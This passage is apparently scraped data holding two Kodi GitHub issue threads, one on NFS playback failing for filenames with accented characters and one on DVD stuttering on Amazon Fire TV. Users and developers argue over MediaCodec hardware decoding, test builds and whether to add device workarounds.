know what's going on. In kodi 17 I'm able to play them all. So where should I look for solution? In pc NFS share settings?  NFS3ERR_NOENT(-2) means file not found, or like Irusak said, its not accessable. this could mean wrong rights or files are moved somewhere. when i told you its working for me, i tried that too over NFS from my nas with NFS V3  I think this can be better taken to the forums, perhaps somewhere there can help you track down your NFS issues.  @friend had similiar problems in 2012 with, just found an old support ticket,  I use hane winnfs server and I'm almost sure that settings are fine.  I tried today kodi 17 from Google play on shield tv and on my smartphone. On both devices I can play those files without any problems. So there is something wrong in nfs share support implementation in kodi 18.  Rather looks like your setup as it works for others using NFS. Am Fr., 9. Nov. 2018 um 2231 Uhr schrieb kolunio82  notifications@friend.com --                     Key-ID     0x1A995A9B                keyserver pgp.mit.edu  ============================================================== Fingerprint 4606 DA19 EC2E 9A0B 0157  C81B DA07 CF63 1A99 5A9B  I tested on the shame shield tv device in the same my home network. Only change is replace kodi 18 to 17 from Google play.  Post a log for both please. Am Sa., 10. Nov. 2018, 0941 hat kolunio82 notifications@friend.com geschrieben  this one, right nfs//192.168.1.31/z/movies/MUSIC/Ti�sto - Live @ Tomorrowland 2017 (1080p_25fps_H264-128kbit_AAC).mp4 ? Wondering if � has something to do with it in comparison to v18 log @friend If you rename this one to Tisto - Live at Tomorrowland 2017.mp4 does it start to work?  Nope crashes to desktop.  Mmh - works from non Android kodis, right? If you could provide an adb log that would be really helpful  Ok I know what is wrong but I don't know how to fix this. When filename contains other letter than from English I can't play the file. I replace Tiësto to Tiesto and it works.  @friend i have downloaded this file and tested on my shield, file location is on qnap nas with nfs. for me its working.. @friend  i think its logcat he wants, download adblink and enable in shield under developer options network-debugging. then  with adblink open ADB shell. logcat -d -f /scdard/logcat.txt  @friend good - this is what I asked you above. So in short we have an issue with passing the ""correct"" encoding so that it is understood by the other side ... @friend logcat is not needed. The error is clear now. It's this   So there is a easy way to fix this? I tried to change language settings in kodi but doesn't work. Also I tired to change filenames display mode in server settings from UTF-8 to windows ansi. But when I change to ansi kodi doesn't see files with others characters at all. )  Nope - no easy fix. I pinged the guys on IRC. Let's see ... still wondering why it only misbehaves on Android and other kodi v18 work with the same NAS. I did not expect that this is ""platform specific"" code.  @friend ok, its the ë that couse this problem....but why is it working for my nvidia shield with android and qnap nfs? i did not renamed the file  You really ask? -) ... It's Microsoft on the other side ...  ) ok i understand, thank you  So the question is why KODI 17.6 can play those files and KODI 18 don't. )  is you server on latest version?  ok, then you have to wait, until fritsch talked to the guys on IRC. @friend why do you think the problem is only on android. did i miss something here?  I don't think this is only android problem. Tomorrow I will try kodi 18 on windows 10 and I'll let you know.  I don't think it is only Android, but for now no one told differently. So based on the information in this bugreport it's Android + Windows NFS for now - in this combination. It even worked with just ""changing"" the NFS server to a QNAP one. So most likely it won't work with kodi v18 on Windows as well in combination with THIS nfs server. We will see. As I neither use Microsoft Windows nor Android with a Windows NFS - I cannot really reproduce.  So I still have this problem and It's not fixed.  Did you test that already? If so, what was the result and where is the matching debuglog then?  Latest kodi build win x64.   with english characters works. Withs any others than english don't.  Why bug is marked as invalid? I had still this problem in kodi windows and in kodi Android.  I marked it invalid 21 days ago and told you to go to the forums. Until we verify this is an actual Kodi bug, it really has no place here. That being said, on the forums there will be most likely some people willing to assist.  Forgive me please but I don't understand exactly what should I do now? I posted log from kodi Android and kodi windows 10 and I'n both of them I have the same problem. So I should ask people on forums if they have the same problem as I?  You should go there, open a thread and ask people to help you troubleshoot why your NFS server has incompatibility with Kodi 18. For reference, myself and loads of others are opening files with crazy characters from all kinds of NFS servers with Kodi 18. You haven't convinced us it is not a bug with haneWin. (I would say we are only getting more and more convinced it is.) We can definitely help you troubleshoot why it becomes visible in 18 and not 17 though - for this you will likely need to do a lot more testing, so prepare your debug logs. It would also be extremely valuable if someone could reproduce the bug and help you troubleshoot. The forum is the place to do this - especially since every comment here spams everyone involved. Github issues is not a replacement for the support forum - it is for technically reporting errors with Kodi code that need to be fixed.  From HaneNFS serwer author ""tested an elder VLC on Andorid 4.4 and the latest vlc version on Android  8.0 without any problems. I also verified that non ASCII characters are  ok in VLC on Android. Best regards, Herbert Hanewinkel"" So if HanesNFS works without any problems as nfs server for VLC answer for me is obvious - kodi is responsible for error. Another proof is that kodi 17.6 works fine and 18 don't. Fix your software and don't blame haneNFS.  What is the link to your forum thread you opened so we can help you find enough info to fix it  - (whether that is in hanewin or in Kodi does not matter really ) I offered help a few times and said there is not enough info for this ticket. I have been nothing but clear about the need to open a thread on the forum for this, so the issue can be reproduced. You keep posting partial (and not nearly enough) information here, and now have added a more than unwelcome negative attitude on top of it. I'll give you a last chance to open a forum thread and link to it here. After that I will simply close communication as I prefer not to deal with people who are not willing to work together  to solve an issue.  I've done this arleady -  I show you video with error step by step -  should I give you more?  Nothing. This ticket is closed for communication, and we can reopen it when we have enough information collected (through the thread) to actually fix something - if the issue is indeed in Kodi. EDIT I just looked at your thread and it contains even less information than the sparse information in this ticket. I suggest you reread everything I said so far, and create a support thread in the forum, or edit your previous thread and forum title. Post as much information as you can in it and hope someone can reproduce it. I will reiterate it once more We can not reproduce the issue with any normal NFS setup so far. It is cool you got someone to test another app and this NFS server, but it is no definitive answer. To highlight this   several of our team tested the same app and another NFS server and there are no issues either. This means there is some weird incompatibility specific between HaneWin NFS with your settings in it + Kodi 18 with your settings in it. This will require a lot of testing on your part. ",47,47,398,0.19148936170212766,0.2127659574468085,369,21,
xbmc/xbmc/15405,0.1003707495,xbmc,xbmc,Kodi 18.0 stutters when playing DVD files (VIDEO_TS) on Fire TV,22085,217,225,0.40350877192982454,16,"Bug report Describe the bug I am running Kodi 18.0 as a fresh install on an Amazon Fire TV 3rd gen (2017). When I try to play DVD files (VIDEO_TS.IFO) the movie stutters. It doesn't matter if I install over 17.6 or uninstall 17.6 beforehand for a fresh install. It doesn't matter if I play from SMB (Gigabit ethernet, so no speed problem) or from a local directory (/sdcard/Movies). This worked fine with Kodi 17.6 before. Other movie types (i.e. MKV) are running fine. Expected Behavior DVD videos play smoothly. Actual Behavior DVD videos start to play, then stutter. Audio stutters a little later (after 10 seconds). To Reproduce Steps to reproduce the behavior  Use Amazon Fire TV 3rd gen (2017) Copy a DVD structure below /sdcard/movies AUDIO_TS VIDEO_TS VIDEO_TS\VIDEO_TS.IFO VIDEO_TS\VTS_01_0.IFO VIDEO_TS\VTS_01_1.VOB VIDEO_TS\VTS_01_2.VOB ... Install Kodi 18.0. Add /sdcard/movies as Data source Play the movie. It stutters.  Debuglog The debuglog can be found here  Environment Used Operating system  [x] Android  Operating system version/name Amazon AFTN with Android 7.1.2 API level 25  Amazon software version Fire OS 6.2.5.8 (NS6258/1607) Kodi version 18.0 Git20190128-d81c34c   Out of curiosity I installed Kodi 18.0 on my phone (Moto G6 plus running Android 8.0) and my tablet (Google Pixel C running Android 8.1). I was not able to reproduce the problem there. So it seems that the issue is related to the Amazon Fire TV.  Jep - mediacodec is as stable as the vendor implementation -) On your FireTV try to disable ""Mediacodec and Mediacodec Surface"" before playing the DVD please. Don't forget to turn it on again afterwards.  This indeed helped. Thank you. I am sorry but I fail to make sense of this.  If ""Mediacodec"" is something within Kodi then Kodi 18 introduced a bug that wasn't present in 17.6. In this case a reference to the vendor implementation would not apply. If ""Mediacodec"" is something within Fire TV then it is still the same as it was with Kodi 17.6. Why would it be less stable when used with Kodi 18.0?   No - in v17. Mediacodec was disabled by default for DVDs. Some forum users forced us to enable it by default - screaming loud and shout, you know.  Well, now you have me screaming and shouting ... How about a switch like ""Disable Mediacodec when playing DVDs""?  Nope - we rather want that FireTV people just fix their decoder -) ... and this won't happen if we add workaround after workaround.  Im sorry, but I disagree. you can't expect Amazon to fix something they don't have any reason to consider broken. From their point of view anything not working in Kodi on FireTV is fine. FireTV is a vehicle to sell more Amazon content, not a friendly and cooperative environment to run things that tend to sell less Amazon content. Obviously this Mediacodec topic is a thing that makes people unhappy. Some want in on by default, some want it off by default. I propose to have it on by default unless the content is a DVD. That seems to be what it was before Kodi 18 and I never even noticed its existence - it just worked. Now it is on by default and I am forced to switch it off manually when playing DVD content. So by removing a ""workaround"" (I would prefer to call that a ""feature"") you force me to manually toggle a switch that is hidden in the advanced settings - probably for good reasons. I would prefer not having to fiddle around in settings every time I change the type of content I intend to play. Please reconsider my request to introduce a setting ""Disable Mediacodec when playing DVDs"". It doesn't look like a complicated thing to implement.  We can expect a lot of thing from Amazon. We also expect users to understand why we do certain things (do not workaround broken firmware by adding stupid switches).  We did not make the decision for you to buy an Amazon device that has clearly not been designed to play such files. So i suggest to find some other device then.  Actually, we are at a point where a perfectly working feature has been removed from Kodi between 17.6 and 18.0. I prefer to not throw around the word ""stupid"" but deleting something that made Kodi work out of the box for anything thrown at it and instead have users fiddle around in advanced settings does not look like a completely mature and understandable decision to me. I do not know how I deserve to be treated in that manner. I asked politely about the circumstances and after I read the facts that have been told here I asked politely to add a switch that brings back a deleted feature. Also I disagree about the FireTV ""clearly not been designed to play such files"". Kodi on FireTV played them perfectly until 17.6. It does play them perfectly in 18.0 if I fiddle around in advanced settings. My request is to reduce the necessary fiddling. The Wiki ( says ""The main aim for the Android port of Kodi is to foremost target media-players/set-top-boxes/sticks that connect to a large screen television and uses a standard remote control as its main interface device."" That sounds like the mere definition of ""FireTV"" to me. We all know that Android is a heterogeneous market. Nearly every device has this or that shortcoming. No reason to throw the FireTV out of the window.  Your argumentation is fully correct. Perhaps amazon did not even try to fix it, cause we had it off in the past ... pure speculations. I don't like when users suffer though. Okay with a custom v18 build that disable Mediacodec for mpeg-2?  Here  - results will be called androidswmpeg2 - it will (other than the name tells) stop dvd acceleration for mediacodec - result is uploaded here  in some minutes.  I'm probably facing the same issues as Robert Dahlem on my Beelink GT1 with stuttering dvds. I'll try the test build and will report the results later.  I tested kodi-20190203-6958f4c5-androidswmpeg2-armeabi-v7a.apk as fresh install as well as installed over my 18.0 configuration. It plays DVDs perfectly without stuttering now. Thank you!  I also have the same problem but on .avi files (mpeg4 - xvid codec). Disabling mediacodec works fine (stuttering is gone) - But more cpu load and way more battery usage coz of disabling hardware acceleration. Also tested that Kodi build from @friend - but didnt solve my problem (sure, its another codec). But generally with the build from @friend other codecs are playing better (I think) - less cpu load on activated hardware acceleration Edit Android 8.1 (non rooted) Google Nexus 5x Problem recognized since Kodi v.18.0 (clean installed w/o any plugins from google play store)  Playing dvds works fine in this version. I only had to change a system setting for DTS sound to work correctly.  I can disable for mpeg4 &lt; 720 width again. Will upload a tesbuild tonight. Am Mo., 4. Feb. 2019, 1325 hat Markman-B notifications@friend.com geschrieben  Nice thank you (just for interest the only mpeg4 files I have tested was SD quality). So like mpeg2 before - you only disable hardware acceleration for this two codecs ? Is there anyway to fix later ? Sure the problem is gone for now but the downside is more battery usage (cpu load). So i think for future proof is to fix it not only disabling it or is there some misunderstood of me ? EDIT I am not that Android pro and not familiar with android coding and so on...  No problem. Let's try. Am Mo., 4. Feb. 2019, 1606 hat MisterT87 notifications@friend.com geschrieben  sure - can you link it here if build is ready ? )  Will result in very same folder in roughly 60 minutes. More I cannot do for you. Bye -)  Finally some sanity after @friend's well constructed argument. @friend is this just for mpeg2 DVD's or all mpeg2 content &lt;720 ? Any chance we can get All &lt; 800 mpeg2 content SW decoded by adding  test - kodi-20190120-fe68d404-powrevert-armeabi-v7a.apk with commit # fe68d404 is the best I've seen EVER for Android Leia SW decoding and rendering performance on ARM platforms. # d2f0c5f was also good. Tested on a GLES 2.0 Oreo Mi Box and GLES 3.2 MM MINIX U9. Basically I'm trying to get 25i/720x576 mpeg2 DVD's and broadcast TV SW decoded and deinterlacing on Android ARM, without fiddling incessantly with acceleration settings. Current androidswmpeg2-armeabi test .apk's above do not default to SW decoding for 25i/720x576 mpeg2 TV., prob because you are using if (hints.width &lt;= 700)  Better use this  - the rest is only hackery ... it has settings for h264, mpeg2, mpeg4(xvid) and uses the powrevert ...  Thx. That will fix everything. EDIT it's on Kodi test servers... Yes that works nicely for 720x576 SW decoding and rendering, but All acceleration options have gone missing in Kodi settings. That whole section is missing.  Tested this APK mpeg4 videos still stuttering like before (with hardware acceleration enabled) ( XBMC Player info from tested file Decoder amc-mpeg4(S)(HW) Pixel-Format Surface MediaInfo AVI 1. Video-Stream MPEG-4 Visual (XviD) 1687 kb/s, 720x400 (169) @ 25,00 fps, MPEG-4 Visual (XviD) (Advanced Simple@friend) (BVOP1)  @friend can you try this instead for SW decode &amp; settings options  to runtime test on AML Linux Leia...  No time. Feel free to fix it up or send a PR. Remember Android specific settings should not bloat settings.xml which is why I tried to move it to android.xml where it's place is Whenever you send a PR to my repo I will start a build. Am Di., 5. Feb. 2019, 1036 hat wrxtasy notifications@friend.com geschrieben  Ok, cool. PR inbound to test shortly. Done.  For good reason. SW rendering performance has dramatically been degraded. With that approach, neither HW nor SW would have worked flawlessly on the Fire TV. HW decoding DVD/MPEG-2 still works on many devices. And for those devices where it does not work, MediaCodec can be disabled manually. So it still works. Forcing SW decoding means far (and I really mean far) inferior scaling and deinerlacing on modern TVs. And there has been no way of enabling HW decoding in V17 Krypton. So what's the better solution? Kodi V17 performed ""SW emulation"" to get it working. With this android.xml approach, those switches are not accessible by the user either as far as I can see. What about @friend's mentioned blacklist approach?  That is not my observation. 17.6 silently switched off Mediacodec for DVDs and fell back to SW rendering with flawless performance. 18.0 did not automatically switch off Mediacodec, DVDs stutter. When I manually switched off Mediacodec DVDs worked. Fritsch's version (18.1 RC1) returned the 17.6 behaviour and DVDs worked out of the box. To sum that up on todays FireTV DVDs do not work with HW rendering and work with SW rendering. I do not dispute that. That leads to a user annoyance we have at least on device (the FireTV) where you would need to manually switch on or off Mediacodec depending on the type of content you watch. I do not advocate ""forcing SW decoding"". What I request is a configuration option that allows me to use Mediacodec in the default case and to switch it off explicitly for DVD material. The former we have already, the latter is my request. Ideally it would switch off DVD HW rendering automatically (like in 17.6) but only if FireTV hardware is detected. One can dream ... I do understand that additional switches are a disputed topic. From my point of view switches come into play when you can't make a sensible choice fitting all cases. Forcing the user to change a setting each time they change content type is not a sensible choice. Deliberately sabotaging DVD playback on the FireTV to force Amazon to fix their Mediacodec will produce nothing you can force Amazon to nil. Instead, users will only see that DVD playback does not work with Kodi 18.0 on FireTV and will stay with 17.6. That is one way to go blacklist Mediacodec for combinations of hardware and content type that are known to malfunction. I would still opt to make that user configurable so people can experiment (i.e. when a new FireOS comes out).  True. Final V18 fixed the SW rendering bottleneck, or at least mitigated it, enabling proper playback of 25fps (incl. interlaced with deinterlace-half) material. All I wanted to say was that people have been asking for HW decoding when SW was badly broken, countering @friend's alternative facts. I think that the real issue is understood now and that it might be safe to re-enable SW for DVD and MPEG-4 ASP SD by default. Probably all of today's Android TV devices can cope with that. SW decoding has quite some downsides though (performance- and quality-wise) and since many devices properly support HW decoding, forcing SW would't be a good solution IMHO (which I understand you are not advocating).  I just downgraded to 17.6 to check that. DVDs play fine if Mediacodec is switched on or off. So, no V18 fixed nothing with SW rendering that needed to be fixed, at least not on FireTV. ""Alternative facts""? Do you consider this a contribution to the discussion which should be taken seriously? Because I have my doubts.  I meant V18 final relative to earlier V18 RC/nightly builds. Anyway, doesn't matter indeed. A good solution needs to be found.  Here you go. There is a solution but it's unacceptable to the Kodi codebase gatekeepers. I cannot be bothered trying to implement an alternative solution at this time, nor spend time Android compiling. It uses the same user configurable HW SW switching as SPMC 16.x / 17  will also need this set of @friend patches for better ARM rendering performance  compile away and Android AML and Fire TV users will have a workable solution.  IIRC, the issue is very specific to MPEG2 from dvd, which has some peculiarity (that I can't remember right now) that some h/w decoders chokes upon. Just bring back ""hints.dvd"" from  , one way or another ;) PS Oh  sure why users would scream if DVD MPEG2 is SW decoded? Thanks for the ""quick hack"" comment, btw. You're welcome to try to convince Amazon to fix the issue ;)  People screamed because SW wasn‘t feasible anymore due to a bottleneck in the GLES rendering path. SW means far inferior PQ. HW deinterlacers and scalers are so much better.  Oh, so Kodi went to the quick hack rather than fixing the GLES rendering path? Hehe... I think I remember the issue is specific to DVD on filesystem, btw. Pretty sure ISO's didn't have the issue.  A good example is the bugs bunny NTSC iso (VOB container + mpeg2) Does not work at all with h/w on both AFTV devices, but they stutter differently. This ISO plays well on WETEK Hub and shield b.t.w.  Hi, thank you fritsch for your build!  However it has a problem -- the hardware acceleration options do not show under ""Player"" menu.  I modified your build and re-compiled Kodi, putting the settings back into settings.xml instead of android.xml.  This fixed the problem and now there are user-configurable switches to turn software decoding on/off/HD only for mpeg2, mpeg4 and h.264. Here is my build apk ftp//ftp.ccb.jhu.edu/pub/alekseyz/kodiapp-armeabi-v7a-debug.apk I tested this apk on my fire TV 3 and everything works perfectly, DVD, HD, 4K, HDR, autoframerate, etc. This is my first time buiding Kodi.  I am concerned about apk size -- it is over90Mb, whereas your apk is about 60Mb.  I suspect the standard ""make apk"" command maked apk with debugging information -- how can I make a smaller ~60Mb apk?  Yes. I know, just one number is wrong in android.xml. But I stopped caring. There are guys in this thread knowing better anyways, let's wait on them. Talk is cheap, you know -) Am Mi., 20. Feb. 2019, 0357 hat Aleksey Zimin notifications@friend.com geschrieben  I would just like to have a working Kodi that plays everything on my Fire TV -)  Now I have it and everything works to my satisfaction! In the future Android ARM devices will have more powerful CPUs, but support for older codecs may disappear from firmware alltogether. Thus there is definitely need to have SW decoding to fall back on.  Out of curiosity, which number is wrong in your android.xml?   be group id=""3""  I have cloned the Kodi master branch, and introduced the same changes into settings.xml, Settings.cpp, Settings.h, and DVDVideoCodecAndroidMediaCodec.cpp.  Compiled and tested -- works just fine.  Plays all DVD ISOs, Blu-ray ISOs, autoframerate, 4K, HDR, all works.  I am running GUI at 720p to allow TV to do the upscaling in most cases, because Kodi does not seem to be able to lower its resolution, i.e. when GUI is set to 1080p, it will upscale all videos to 1080p. Kodi still upscales 480p and 576p files, but this looks fine. Here is the apk ftp//ftp.ccb.jhu.edu/pub/alekseyz/kodi/kodi18.1master-armeabi-v7a-androidswmpeg2-mod.apk the apk compiled from fritsch's fork branch androidswmpeg2 with my modifications is here ftp//ftp.ccb.jhu.edu/pub/alekseyz/kodi/kodi18.1RC1-armeabi-v7a-fritsch-androidswmpeg2-mod.apk As far as I can see these apks work the same on my Fire TV 3 pendant.  I am posting this apk for those users who are unable to compile Kodi, but would like a working alternative 18.1 release (or 18.2RC) with SW decoder switches.  It still puzzles me why Kodi developers do not want to include these switches into the main build -- they do not hurt anything, and they help many users of popular Fire TV and other non-Kodi-oriented hardware.  @friend Thanks for the new builds. Quick question - I wasn't following the difference between the two apks. What is the difference?  Stop posting these builds and whatever. They bring absolutely nothing to this created issue ticket. If this continues i will close and lock it  With all due respect, there would be no need for these builds and for this whole thread if developers of team Kodi agreed to allow users to choose to use SW decoding for codecs (mostly mpeg2 and mpeg4, and interlaced h264) that are poorly supported on popular, but NOT designed for Kodi use, platforms like Amazon Fire TV.  I do not think that Amazon cares to support mpeg2 and interlaced formats properly because they have no use for it, and so one would not expect them to work on proper implementation.  Go buy a different device is my advice  I agree with @friend.  Amazon has no incentive to fix this, but team KODI does.  KODI should be user driven, and I don't understand why you wouldn't accept code that is already available in order to make all users happy with your platform?  Who would be upset by the ability to make all devices just work?  @friend, do you still need to be reminded of  ? ""The main aim for the Android port of Kodi is to foremost target media-players/set-top-boxes/sticks that connect to a large screen television and uses a standard remote control as its main interface device."""" In short ""Amazon FireTV"". From a project manager I would appreciate a less hostile attitude towards users.  No, I will not go and buy a different device. I like Fire TV, because it has a lot of content and apps that I use.  Much more than Nvidia Shield.  For example National Geographic/ Science Channel apps are non existent on Android TV but they are well implemented on Fire TV. Fire TV is just not as great natively for my local content, like backed-up DVD and blu-ray ISO's etc., as it is not designed for that.  But  Kodi accomplishes the task of playing local content very well.  I can buy a separate device for Kodi use, but this would be another box with wires connected to my TV, and this is completely unnecessary, as Fire TV hardware is completely capable of playing all my content well enough for my living room TV.  For advanced Kodi use I have libreelec S905X box in my basement home theater system. Why one would want to restrict capabilities of Kodi is beyond my understanding. This looks like team-Kodi is becoming politcal in its decisions instead of user-oriented.  I am all for clean code, reliability and compatibility, but hiding useful and well implemented options like SW decoding from users is unwise.  The only way to help Android is not to add workarounds for every shitty 40 dollar device someone spits out for the sole goal to sell users their own content. Why do you give amazon money and don't expect from them that they fix their product? On the other hand you argue with volunteers that they add workarounds? 2 for AMLogic 3 for Mediatek 2 for FireTV1 3 for FireTV3 1 for FireTV 4K and so on? Is that really the strategy that you want from an OSS mediacenter like kodi with exactly one Android Developer? Buy a 40 dollar device from amazon and expecting that volunteers fix their shit in the freetime is unwise ...  I don't think I'm the only person that believes Amazon as a company has more devices out there (read a larger base for Kodi installs) than AMLogic.  So maybe not every workaround is a required one, but who drew the line on Amazon devices?  Seems really foolish.  You can have a very clean code, but if a large portion of the user base moves to a competitor that DOES work for their device, what good is that strategy?   it is much cheaper to switch software than to switch hardware.  I myself have 7 fire devices that run Kodi.  Let me ask differently Which workarounds for which device do you find here   is much cheaper to switch software than switch hardware"" &lt;- I believe, that this is cheaper for you - as it's my freetime that is wasted to write the code.  Here, have fun with your 7 devices  If Kodi wants to have pure code, they have to offer their own hardware and only support that (Apple style).  However, by its own description it is made to work on many devices, so ""workarounds"" are part of the deal.  I guess that a totally pure codebase that works on only select devices is what you want.  As a developer myself, I can't help but shake my head at how this thread has gone.  It is a sad day in the life of this project.  If you are a developer then you should step up and start fixing stuff instead of demanding workarounds for bad devices.  It's a sad day for you as developer, demanding workaround stuff from OSS developers while at the same being able to fix the root cause yourself, so that no workarounds would have been needed, this is really sad, especially as your highly wanted workaround is just 10 lines of code ... ",66,90,853,0.22807017543859648,0.3684210526315789,1084,29,
